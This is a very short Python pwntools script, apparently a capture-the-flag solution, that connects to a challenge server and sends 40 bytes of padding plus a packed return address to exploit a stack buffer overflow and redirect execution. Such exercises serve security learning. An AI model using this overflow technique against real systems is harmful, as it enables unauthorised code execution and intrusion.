#!/usr/bin/python3
from pwn import *
r = remote("ret.ch2.btsctf.pl",55125)
r.recv()
r.sendline(b"A"*40+p64(0x4011b6))
r.recvline()
print(r.recv())
